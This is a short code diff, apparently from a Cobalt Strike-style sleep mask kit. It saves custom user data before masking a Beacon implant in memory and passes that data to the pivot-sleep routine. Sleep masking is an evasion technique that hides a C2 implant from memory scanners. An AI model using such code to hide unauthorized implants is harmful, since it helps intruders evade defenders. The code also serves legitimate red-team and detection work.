@@ -12,7 +12,15 @@
 * @param info A pointer to a SLEEPMASK_INFO structure
 */
 void SleepMaskWrapper(PSLEEPMASK_INFO info) {
-    DFR_LOCAL(KERNEL32, Sleep)
+    DFR_LOCAL(KERNEL32, Sleep);
+
+    // Save any custom user data prior to masking Beacon
+    CUSTOM_USER_DATA customUserData;
+    _memset(&customUserData, 0, sizeof(CUSTOM_USER_DATA));
+    char* customUserDataPtr = BeaconGetCustomUserData();
+    if (customUserDataPtr != NULL) {
+        _memcpy(&customUserData, customUserDataPtr, sizeof(CUSTOM_USER_DATA));
+    }
     
     // Mask Beacon
     MaskBeacon(&info->beacon_info);
@@ -24,7 +32,7 @@ void SleepMaskWrapper(PSLEEPMASK_INFO info) {
     }
     else if (info->reason == PIVOT_SLEEP) {
         DLOGF("SLEEPMASK: Pivot sleep (SMB/TCP)\n");
-        PivotSleep(info);
+        PivotSleep(info, &customUserData);
     }
 
     // UnMask Beacon
